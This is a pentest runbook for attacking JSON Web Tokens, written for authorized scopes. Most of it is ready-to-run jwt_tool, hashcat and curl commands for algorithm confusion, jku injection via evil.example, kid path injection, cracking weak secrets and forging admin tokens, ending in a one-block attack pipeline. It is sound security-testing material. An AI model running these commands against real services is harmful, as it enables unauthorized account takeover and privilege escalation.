---
title: "JWT Vulnerabilities"
description: "Test JSON Web Tokens for algorithm confusion, key injection, weak secrets, claim tampering, and expiry flaws."
phase: Web
order: 46
tags:
  - jwt
  - auth
  - tokens
  - cryptography
tools:
  - jwt_tool
  - hashcat
  - curl
  - jq
updated: 2026-10-01
---

A runbook for testing **JSON Web Tokens** in an authorized scope. Goal: determine whether you can forge a valid token through algorithm confusion, key injection, a weak secret, or claim tampering.

## 1. Decode and baseline

Split the token on dots and decode the header/payload. Note `alg`, `kid`, `typ`, `exp`, and any embedded keys.

```bash
TOKEN='eyJ...'
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq
echo "$TOKEN" | cut -d. -f3 | wc -c   # signature length hints at alg
```

## 2. Run the automated scan

`jwt_tool` enumerates the common attacks in one pass.

```bash
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -M at -t https://target/api/me
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -X a   # all tests
```

## 3. Algorithm attacks

Try `alg=none`, then RS/HS confusion where the server expects RS256 but you sign HS256 with the public key as the HMAC secret.

```bash
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -X a -pk public.pem
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -S hs256 -p "$(curl -s https://target/.well-known/jwks.json | jq -r '.keys[0].n')"
```

## 4. Key and `kid` manipulation

Point `jku`/`jwk` at a key you control, or abuse `kid` as a path/query injection sink.

```bash
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -X i -ju https://evil.example/jwks.json
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -I -hc kid -hv '../../dev/null' -S hs256 -p ''
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -I -hc kid -hv 'key1' -S hs256 \
  -p "$(curl -s https://target/api/key?id=key1 | jq -r .key)"
```

## 5. Crack a weak HMAC secret

Offline crack with hashcat mode 16500.

```bash
printf '%s\n' "$TOKEN" > token.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 16500 token.txt --show
```

## 6. Tamper claims and replay

Once you can sign or the server ignores the signature, flip `role`, `sub`, `admin`, and `exp`, then call the API.

```bash
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p '<cracked-secret>' \
  -pc role -pv admin -pc sub -pv 1
curl -s https://target/api/admin -H "Authorization: Bearer <forged>" | jq
```

## 7. Check expiry and revocation

Test missing/`none` `exp`, very long lifetimes, and tokens that keep working after logout.

```bash
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -I -pc exp -pv 9999999999 -S hs256 -p '<cracked-secret>'
curl -s -o /dev/null -w '%{http_code}\n' https://target/api/me -H "Authorization: Bearer <forged>"
```

## 8. Full pipeline (one block)

```bash
TOKEN='eyJ...'
TARGET=https://target
# baseline
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq
# automated attack sweep + algorithm confusion
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -M at -t "$TARGET/api/me"
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -X a
# kid injection
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -I -hc kid -hv '../../dev/null' -S hs256 -p ''
# weak secret
printf '%s\n' "$TOKEN" > token.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 16500 token.txt --show
# forged privileged token
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p '<cracked-secret>' -pc role -pv admin
curl -s "$TARGET/api/admin" -H "Authorization: Bearer <forged>" | jq
```

## Ethics & legality

- Only test tokens and APIs in an official scope or with written authorization.
- Crack secrets offline; never brute-force the live login endpoint during this test.
- Keep the forged token and server response as evidence.
